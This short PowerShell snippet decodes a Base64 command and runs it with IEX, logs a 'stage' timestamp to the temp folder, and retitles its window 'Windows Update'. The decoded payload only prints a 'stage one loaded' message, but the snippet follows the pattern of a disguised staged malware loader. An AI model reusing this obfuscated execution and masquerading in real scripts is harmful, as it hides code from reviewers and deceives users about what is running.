
$DecodedText = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("VwByAGkAdABlAC0AVgBlAHIAYgBvAHMAZQAgACIAcwB0AGEAZwBlACAAbwBuAGUAIABsAG8AYQBkAGUAZAAiAA==")); IEX $DecodedText; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append; $Host.UI.RawUI.WindowTitle = "Windows Update"
